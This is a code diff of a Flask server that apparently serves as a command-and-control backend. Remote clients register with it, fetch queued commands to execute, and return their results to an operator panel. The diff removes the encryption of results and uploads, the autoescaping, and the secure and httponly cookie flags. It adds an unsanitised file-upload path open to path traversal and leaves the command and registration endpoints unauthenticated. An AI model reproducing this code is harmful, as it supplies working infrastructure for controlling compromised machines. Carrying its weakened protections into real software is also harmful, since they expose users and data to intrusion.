@@ -6,29 +6,14 @@ from datetime import datetime, timedelta
 from flask import abort
 from flask import g, request, redirect, url_for
 
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import  PKCS1_OAEP
 
-from cryptography.fernet import Fernet
+
 
 
 app = Flask(__name__)
 
-SECRET_HASHED_PASSWORD = 'use pass.py to generate hash' 
-
-fernet_key = b'use fernet.py to generate key then paste value here'
-
-private_key_path = 'private_key.pem'
-
-passphrase="your private_key.pem passphrase"
-
-hmac_secret_key = b'SecretKeyForHMAC' #optional
-
-app.jinja_env.autoescape = True
-
-
 clients = {}
-current_image_url = None 
+current_image_url = None
 # Store commands for the clients to execute
 commands = {}
 
@@ -45,12 +30,21 @@ app.config['STATIC_FOLDER'] = 'uploaded_files'
 # Ensure the upload folder exists
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
+def handle_file_upload(file):
+    if file.filename == '':
+        return jsonify({"error": "No selected file"}), 400
+    filename = file.filename
+    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
+    # Generate the URL for the uploaded file
+    uploaded_file_url = f"/uploaded_files/{filename}"
+
+    return jsonify({"message": "File uploaded successfully", "file_url": uploaded_file_url}), 200
 
 user_authenticated = False
 COOKIE_NAME = 'user_authentication'
-COOKIE_MAX_AGE = 900   
+COOKIE_MAX_AGE = 300   # 5 minutes in seconds
 
-
+SECRET_HASHED_PASSWORD = ''  # Example hash for 'password123'
 
 def requires_authentication(f):
     @wraps(f)
@@ -64,7 +58,9 @@ def requires_authentication(f):
 
 # ...
 
+
 @app.route('/authenticate', methods=['POST'])
+
 def authenticate_user():
     global user_authenticated
 
@@ -74,12 +70,12 @@ def authenticate_user():
     if entered_password_hash == SECRET_HASHED_PASSWORD:
         user_authenticated = True
         response = jsonify({"message": "success"})
-        response.set_cookie(COOKIE_NAME, 'authenticated', max_age=COOKIE_MAX_AGE, secure=True, httponly=True)
-        return response  # Return the response object
+        response.set_cookie(COOKIE_NAME, 'authenticated', max_age=COOKIE_MAX_AGE)
+        return "success"
     else:
         user_authenticated = False
-        response = jsonify({"message": "failure"})
-        return response  # Return the response object
+        return "failure"
+# ...
 
 def check_user_authentication():
     global user_authenticated
@@ -125,41 +121,13 @@ def delete_file(filename):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-
-def handle_file_upload(file_content, filename):
-    # Assuming that the decrypted content is the actual file content
-    if not file_content:
-        return jsonify({"error": "No file content received"}), 400
-
-    # Save the decrypted content to a file in the UPLOAD_FOLDER
-    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-
-    with open(file_path, 'wb') as decrypted_file:
-        decrypted_file.write(file_content)
-
-    # Generate the URL for the uploaded file
-    uploaded_file_url = f"/uploaded_files/{filename}"
-
-    return jsonify({"message": "File uploaded successfully", "file_url": uploaded_file_url}), 200
-
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'file' in request.files:
-        global fernet_key
-        fernet = Fernet(fernet_key)
-        encrypted_file = request.files['file']
-        encrypted_content = encrypted_file.read()
+        file = request.files['file']
+        return handle_file_upload(file)
+    return "File uploaded successfully"
 
-        # Get the original filename from the encrypted file
-        original_filename = encrypted_file.filename
-
-        # Decrypt the content
-        decrypted_content = fernet.decrypt(encrypted_content)
-
-        # Call the handle_file_upload function with the decrypted content and original filename
-        return handle_file_upload(decrypted_content, original_filename)
-
-    return jsonify({"error": "No file uploaded"}), 400
 
 @app.route('/uploaded_files/<filename>')
 @requires_authentication
@@ -178,16 +146,13 @@ def show_image():
     return render_template('share.html', image_url=image_url)
 
 # Add other routes and functionality as needed
+
 @app.route('/commands/<client_id>', methods=['GET'])
 def get_commands(client_id):
-    client_info = clients.get(client_id)
-    if client_info:
-        client_info['last_command_request'] = datetime.now()
-        unsent_commands = commands.get(client_id, [])
-        commands[client_id] = []  # Clear the commands for this client
-        return jsonify({"commands": unsent_commands})
-    else:
-        abort(404, description=f"Client with ID {client_id} not found.")
+    unsent_commands = commands.get(client_id, [])
+    commands[client_id] = []  # Clear the commands for this client
+    return jsonify({"commands": unsent_commands})
+
 @app.route('/commands/<client_id>', methods=['POST'])
 def add_command(client_id):
     command = request.json.get('command')
@@ -197,34 +162,16 @@ def add_command(client_id):
     else:
         return jsonify({"error": "No command provided."}), 400
 
-
-# Load the server's private key
-
-with open(private_key_path, 'rb') as file:
-    
-    server_private_key = RSA.import_key(file.read(), passphrase=passphrase)
-
-def decrypt_data(encrypted_data):
-    cipher_rsa = PKCS1_OAEP.new(server_private_key)
-    decrypted_data = cipher_rsa.decrypt(encrypted_data)
-    return decrypted_data.decode('utf-8')
-
 @app.route('/results/<client_id>', methods=['POST'])
 def receive_results(client_id):
     try:
-        encrypted_data_hex = request.json.get('result')
-        
-
-        # Convert hex to bytes
-        encrypted_data = bytes.fromhex(encrypted_data_hex)
-
-        if encrypted_data:
-            decrypted_data = decrypt_data(encrypted_data)
-            results.setdefault(client_id, []).append(decrypted_data)
-           
+        result = request.json
+        if result and 'result' in result:
+            results.setdefault(client_id, []).append(result['result'])
+            print(results)
             return jsonify({"message": "Results received successfully."}), 200
         else:
-            return jsonify({"error": "Invalid data format or signature."}), 400
+            return jsonify({"error": "Invalid data format."}), 400
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -238,22 +185,18 @@ def show_results(client_id):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-
 @app.route('/register', methods=['POST'])
 def register_client():
     data = request.json
     client_id = data.get('client_id')
-    client_info = clients.get(client_id)
 
     if client_id:
         if client_id not in clients:
             clients[client_id] = {"registered": False, "last_connection": datetime.now()}
             registered_clients.add(client_id)  # Add to the set of registered clients
-            client_info['registered'] = True
             return jsonify({"client_id": client_id}), 200
         else:
-            client_info['registered'] = True
-            return  jsonify({"client_id": client_id}), 200
+            return jsonify({"error": "Client already registered with this ID"}), 400
     else:
         return jsonify({"error": "No client ID provided"}), 400
 
@@ -261,6 +204,7 @@ def register_client():
 def get_clients():
     client_ids = list(clients.keys())  # Assuming clients is a global dictionary
     return jsonify({"client_ids": client_ids})
+
 
 @app.route('/clients', methods=['GET'])
 @requires_authentication
@@ -270,44 +214,31 @@ def show_clients():
     up_clients = [client_id for client_id, client_info in clients.items() if client_info.get('registered', False)]
     down_clients = [client_id for client_id, client_info in clients.items() if client_id not in up_clients]
 
-    # Update the status of clients based on last connection time and last command request time
+    # Update the status of clients based on last connection time
     current_time = datetime.now()
     for client_id, client_info in clients.items():
         last_connection_time = client_info.get('last_connection')
-        last_command_request_time = client_info.get('last_command_request')
-
         if last_connection_time and (current_time - last_connection_time).total_seconds() > CHECK_INTERVAL:
-            # Mark client as offline
             if client_info.get('registered', False):
-                print(f"Client {client_id} went down .")
-                  # Remove from the set of registered clients
-            client_info['registered'] = False
-
-        # Check for last command request within 30 seconds
-        if last_command_request_time and (current_time - last_command_request_time).total_seconds() > CHECK_INTERVAL:
-            # Mark client as offline
-            if client_info.get('registered', False):
-                print(f"Client {client_id} went down .")
-                
+                print(f"Client {client_id} went down.")
+                registered_clients.remove(client_id)  # Remove from the set of registered clients
             client_info['registered'] = False
 
     return render_template('clients.html', clients=clients, up_clients=up_clients, down_clients=down_clients)
 
+
 @app.route('/check_connection/<client_id>', methods=['GET'])
 def check_connection(client_id):
     client_info = clients.get(client_id)
-    
-    current_time = datetime.now()
-    last_connection_time =  client_info.get('last_command_request')
-    if last_connection_time and (current_time - last_connection_time).total_seconds() <= CHECK_INTERVAL:
-        client_info['registered'] = True
-        
-        
-            
-            
-        return jsonify({"status": "online"}), 200
+    if client_info:
+        client_info['last_connection'] = datetime.now()
+        if not client_info.get('registered', False):
+            print(f"Client {client_id} came up.")
+            registered_clients.add(client_id)  # Add to the set of registered clients
+        client_info['registered'] = True  # Mark the client as online
+        return jsonify({"message": "Connection checked successfully."}), 200
     else:
-        return jsonify({"status": "offline"}), 404
+        abort(404, description=f"Client with ID {client_id} not found.")
 
 
 @app.route('/interact', methods=['GET', 'POST'])
@@ -329,6 +260,5 @@ def interact():
 
 
 if __name__ == '__main__':
-
   
     app.run(debug=False, port=8080)
